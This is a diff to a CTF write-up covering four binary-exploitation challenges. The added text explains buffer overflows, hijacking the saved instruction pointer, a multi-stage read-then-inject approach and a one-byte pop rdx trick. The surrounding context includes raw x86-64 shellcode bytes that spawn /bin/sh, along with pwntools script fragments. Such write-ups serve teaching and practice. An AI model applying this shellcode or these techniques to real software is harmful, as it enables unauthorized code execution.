@@ -1,6 +1,8 @@
 # shellcode ![c](https://img.shields.io/badge/solved-success)
 ### Analysis
-By analyzing the disassembled source code with ```Ghidra```, executing ```checksec ./shellcode``` and ```file ./shellcode``` we can see that this is a really trivial *buffer overflow* vulnerability, with 64-bit architecture, no mitigations techniques on a non-stripped file. We can notice that by overwriting the content of the bss we can also overwrite the Saved Instruction Pointer in order to hijack the flow of the program and redirect it to the overflowed buffer (at address 0x601080).
+By analyzing the disassembled source code with ```Ghidra```, executing ```checksec ./shellcode``` and ```file ./shellcode``` we can see that this is a really trivial *buffer overflow* vulnerability, with 64-bit architecture, no mitigations techniques on a non-stripped file. We can notice that by overwriting the content of the bss we can also overwrite the Saved Instruction Pointer in order to hijack the flow of the program and redirect it to the overflowed buffer (at address 0x601080). 
+
+After that, our shellcode will spawn a shell with *system("/bin/sh")* system call.
 ### Exploit
 First shellcode is the most trivial one, while the Second is position-independent:
 ```python
@@ -47,7 +49,6 @@ shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8
 # nop
 
 
-
 shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
 shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8
 
@@ -61,6 +62,9 @@ r.interactive()
 # sh3llc0d3 ![c](https://img.shields.io/badge/solved-success)
 ### Analysis
 This is pretty much the same of shellcode, but this time we can see from ```file ./shellcode``` that is on 32-bit architecture. That is, we have to write our shellcode in a different way (actually the main difference is the *int 0x80* instruction instead of *syscall*). 
+
+Our goal is still to spawn a shell with *system("/bin/sh")*.
+
 ### Exploit
 ```python
 from pwn import *
@@ -84,7 +88,11 @@ r.interactive()
 
 # multistage ![c](https://img.shields.io/badge/solved-success)
 ### Analysis
+This is still a *buffer overflow* vulnerability, but there is a problem: we only have 20 bytes to write, so even the smallest shellcode to execute *system("/bin/sh")* could not fit in it.
+
+Multi stage is the key: plan the shellcode by first overflowing the buffer with a *read* call from stdin with the buffer itself as target address in order to perform a shellcode injection later. After that, write the actual shellcode in the read: now we don't care about the actual length because we don't need to preserve the Saved IP anymore.  
 ### Exploit
+```python
 from pwn import *
 
 #context.terminal = ['tmux', 'splitw', '-h']
@@ -114,6 +122,13 @@ r.interactive()
 
 # gimme3bytes ![c](https://img.shields.io/badge/solved-success)
 ### Analysis
+This challenge is pretty much the same as multistage, but we have even more space in the buffer: as the name says, the buffer is only 3 bytes big.
+
+The real problem is: if we want to do a syscall, just its translation is of 2 bytes (0x0f and 0x05). So we must find a way to set up all the parameters in 1 byte!
+
+Fortunately, by analyzing the program with ```gdb``` and putting a breakpoint right after the overflow, we can see that the values on the registers are already perfect to setup a read syscall, despite the rdx register: we can exploit the count parameter of the read function and thus load in rdx a very high value already present in the memory: the instruction ```pop rdx (0x5a)``` will occupy exactly 1 byte and will set all the needed parameters to execute a read.
+
+Then we can just inject our real shellcode.
 ### Exploit
 ```python
 from pwn import *
